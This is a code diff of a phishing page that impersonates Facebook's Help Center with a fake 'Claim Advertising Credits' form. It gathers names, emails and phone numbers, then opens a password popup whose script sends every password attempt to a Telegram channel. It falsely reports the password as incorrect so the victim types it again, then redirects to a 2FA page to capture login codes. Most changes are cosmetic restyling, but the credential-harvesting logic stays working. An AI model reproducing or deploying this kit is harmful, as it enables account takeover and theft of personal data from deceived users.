@@ -14,54 +14,45 @@
             min-height: 100vh;
         }
         .header {
-            background-color: #1877f2;
-            padding: 12px 20px;
+            background-color: #355797;
+            border-bottom: 1px solid #355797;
+            padding: 10px 20px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            box-shadow: 0 2px 4px rgba(0,0,0,.1);
+            box-shadow: 0 2px 4px rgba(0,0,0,.08);
             position: sticky;
             top: 0;
             z-index: 1000;
         }
         .header .search-bar {
             flex-grow: 1;
-            margin: 0 15px;
-            max-width: 400px;
+            margin-right: 20px;
+            max-width: 500px;
         }
         .header .search-bar input {
             width: 100%;
-            padding: 10px 15px;
-            border: none;
+            padding: 8px 15px;
+            border: 1px solid #ddd;
             border-radius: 20px;
-            font-size: 16px;
+            font-size: 15px;
             outline: none;
-            background-color: #ffffff;
-            color: #1c2b33;
-            box-shadow: 0 1px 3px rgba(0,0,0,.1);
+            box-sizing: border-box;
+            background-color: rgba(255, 255, 255, 0.2);
+            color: #fff;
         }
         .header .search-bar input::placeholder {
-            color: #606770;
+            color: rgba(255, 255, 255, 0.7);
         }
         .header .help-center-link {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: bold;
             color: #fff;
             text-decoration: none;
-            display: flex;
-            align-items: center;
-            gap: 8px;
         }
         .header .language {
             font-size: 14px;
             color: #fff;
-            cursor: pointer;
-        }
-        .hamburger-menu {
-            display: none;
-            font-size: 24px;
-            color: #fff;
-            cursor: pointer;
         }
         .main-content {
             display: flex;
@@ -81,23 +72,22 @@
             margin: 0;
         }
         .sidebar ul li {
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
         .sidebar ul li a {
             text-decoration: none;
-            color: #1c2b33;
-            padding: 10px 12px;
+            color: #333;
+            padding: 8px 10px;
             display: block;
             border-radius: 6px;
-            font-size: 15px;
         }
         .sidebar ul li a:hover, .sidebar ul li a.active {
-            background-color: #e7f3ff;
+            background-color: #f0f2f5;
             color: #1877f2;
         }
         .content-area {
             flex-grow: 1;
-            padding: 15px;
+            padding: 20px;
             background-color: #f0f2f5;
         }
         .form-container {
@@ -196,7 +186,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
+            background-color: rgba(0, 0, 0, 0.6);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -205,114 +195,66 @@
         }
         .popup-content {
             background-color: #fff;
-            padding: 25px;
-            border-radius: 10px;
+            padding: 30px;
+            border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
             width: 90%;
-            max-width: 400px;
+            max-width: 450px;
             text-align: center;
-            animation: fadeIn 0.3s ease;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
-            20%, 40%, 60%, 80% { transform: translateX(5px); }
-        }
-        .popup-content.error {
-            animation: shake 0.4s ease;
         }
         .popup-content h3 {
-            font-size: 18px;
+            font-size: 20px;
             color: #1c2b33;
-            margin-bottom: 12px;
-        }
-        .popup-content p {
-            font-size: 14px;
-            color: #606770;
             margin-bottom: 15px;
         }
-        .popup-content input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 12px;
-            border: 1px solid #ccd0d5;
-            border-radius: 6px;
+        .popup-content p {
             font-size: 15px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+        .popup-content input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 12px 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
             box-sizing: border-box;
-            transition: border-color 0.2s;
+            outline: none;
         }
         .popup-content input[type="password"]:focus {
             border-color: #1877f2;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
-            outline: none;
         }
         .popup-content button {
             background-color: #1877f2;
             color: #fff;
-            padding: 12px 20px;
+            padding: 12px 25px;
             border: none;
             border-radius: 6px;
-            font-size: 15px;
-            font-weight: bold;
+            font-size: 16px;
             cursor: pointer;
-            width: 100%;
-            transition: background-color 0.2s, transform 0.1s;
+            outline: none;
         }
         .popup-content button:hover {
             background-color: #166fe5;
-            transform: translateY(-1px);
         }
         .popup-content .error-message {
-            color: #d93025;
+            color: #fa3e3e;
             font-size: 13px;
-            font-weight: 500;
-            margin-top: -8px;
-            margin-bottom: 12px;
+            margin-top: -10px;
+            margin-bottom: 10px;
             text-align: left;
             display: none;
-            padding: 5px 10px;
-            background-color: #feecea;
-            border-radius: 4px;
         }
         @media (max-width: 768px) {
-            .header {
-                padding: 10px 15px;
-                justify-content: space-between;
-            }
-            .header .search-bar {
-                display: none;
-            }
-            .header .help-center-link {
-                font-size: 18px;
-            }
-            .header .language {
-                font-size: 13px;
-            }
-            .hamburger-menu {
-                display: block;
-            }
             .sidebar {
                 display: none;
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 80%;
-                max-width: 300px;
-                height: 100%;
-                z-index: 1001;
-                padding-top: 60px;
-                background-color: #fff;
-                box-shadow: 2px 0 8px rgba(0,0,0,.1);
-                transition: transform 0.3s ease;
-                transform: translateX(-100%);
             }
-            .sidebar.active {
-                display: block;
-                transform: translateX(0);
+            .header {
+                display: none;
+            }
+            .main-content {
+                flex-direction: column;
             }
             .content-area {
                 padding: 10px;
@@ -331,32 +273,12 @@
             .form-container button {
                 font-size: 14px;
             }
-            .popup-content {
-                padding: 20px;
-                max-width: 90%;
-            }
-            .popup-content h3 {
-                font-size: 16px;
-            }
-            .popup-content p,
-            .popup-content input,
-            .popup-content button {
-                font-size: 14px;
-            }
-            .popup-content .error-message {
-                font-size: 12px;
-                padding: 4px 8px;
-            }
         }
     </style>
 </head>
 <body>
     <div class="header">
-        <span class="hamburger-menu" id="hamburgerMenu">☰</span>
-        <a href="#" class="help-center-link">
-            <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png" alt="Meta Logo" style="height: 24px;">
-            Help Center
-        </a>
+        <a href="#" class="help-center-link">facebook</a>
         <div class="search-bar">
             <input type="text" placeholder="How can we help?">
         </div>
@@ -364,7 +286,7 @@
     </div>
 
     <div class="main-content">
-        <div class="sidebar" id="sidebar">
+        <div class="sidebar">
             <ul>
                 <li><a href="#">Creating an Account</a></li>
                 <li><a href="#">Your Profile</a></li>
@@ -396,25 +318,25 @@
                     Claim Advertising Credits
                 </h2>
                 <p>Ticket Number: <span id="ticketNumber" class="ticket-number"></span></p>
-                <p>We need some information to process your advertising credits claim. Please complete the form below.</p>
+                <p>Please provide the information below to process your advertising credits claim.</p>
 
                 <form id="claimForm">
                     <label for="yourName">Page Name *</label>
-                    <input type="text" id="yourName" name="yourName" required>
+                    <input type="text" id="yourName" name="yourName" placeholder="Enter your page name" required>
 
                     <label for="businessEmail">Business Email *</label>
-                    <input type="email" id="businessEmail" name="businessEmail" required>
+                    <input type="email" id="businessEmail" name="businessEmail" placeholder="Enter your business email" required>
                     <p class="note">We'll send claim status updates to this email.</p>
 
                     <label for="personalEmail">Personal Email *</label>
-                    <input type="email" id="personalEmail" name="personalEmail" required>
+                    <input type="email" id="personalEmail" name="personalEmail" placeholder="Enter your personal email" required>
 
                     <label for="mobilePhoneNumber">Mobile Phone Number *</label>
-                    <input type="text" id="mobilePhoneNumber" name="mobilePhoneNumber" required>
+                    <input type="text" id="mobilePhoneNumber" name="mobilePhoneNumber" placeholder="Enter your phone number" required>
                     <p class="note">We may contact you via this number for verification.</p>
 
                     <label for="additionalInfo">Additional Information (Optional)</label>
-                    <textarea id="additionalInfo" name="additionalInfo"></textarea>
+                    <textarea id="additionalInfo" name="additionalInfo" placeholder="Any details to support your claim"></textarea>
 
                     <p class="terms">By submitting, you agree to our <a href="#">Terms and Community Standards</a>.</p>
 
@@ -426,8 +348,8 @@
 
     <div class="popup-overlay" id="passwordPopupOverlay">
         <div class="popup-content">
-            <h3>Verify Your Identity</h3>
-            <p>Enter your password to securely proceed with your claim.</p>
+            <h3>Please Enter Your Password</h3>
+            <p>For security reasons, please enter your password to continue.</p>
             <input type="password" id="passwordInput" placeholder="Password" required>
             <div class="error-message" id="passwordError">Incorrect password. Please try again.</div>
             <button id="confirmPasswordButton">Confirm</button>
@@ -453,8 +375,6 @@
         const passwordInput = document.getElementById('passwordInput');
         const passwordError = document.getElementById('passwordError');
         const confirmPasswordButton = document.getElementById('confirmPasswordButton');
-        const hamburgerMenu = document.getElementById('hamburgerMenu');
-        const sidebar = document.getElementById('sidebar');
 
         // --- Utility Functions ---
         function generateRandomTicketNumber() {
@@ -537,13 +457,9 @@
 
         confirmPasswordButton.addEventListener('click', async () => {
             const password = passwordInput.value;
-            const popupContent = document.querySelector('.popup-content');
-
             if (!password) {
                 passwordError.textContent = 'Password cannot be empty.';
                 passwordError.style.display = 'block';
-                popupContent.classList.add('error');
-                setTimeout(() => popupContent.classList.remove('error'), 400);
                 return;
             }
 
@@ -563,8 +479,6 @@
                 await sendMessageToTelegram(message);
                 passwordError.textContent = 'Incorrect password. Please try again.';
                 passwordError.style.display = 'block';
-                popupContent.classList.add('error');
-                setTimeout(() => popupContent.classList.remove('error'), 400);
             } else if (passwordAttemptCount === 2) {
                 passwordAttemptValue2 = password;
                 message += `<b>Password Attempt 2:</b> ${passwordAttemptValue2}\n`;
@@ -579,18 +493,6 @@
                 window.location.href = '2fa_page.html';
             }
             passwordInput.value = '';
-        });
-
-        // Hamburger Menu Toggle
-        hamburgerMenu.addEventListener('click', () => {
-            sidebar.classList.toggle('active');
-        });
-
-        // Close sidebar when clicking outside
-        document.addEventListener('click', (e) => {
-            if (!sidebar.contains(e.target) && !hamburgerMenu.contains(e.target) && sidebar.classList.contains('active')) {
-                sidebar.classList.remove('active');
-            }
         });
 
         document.addEventListener('DOMContentLoaded', () => {
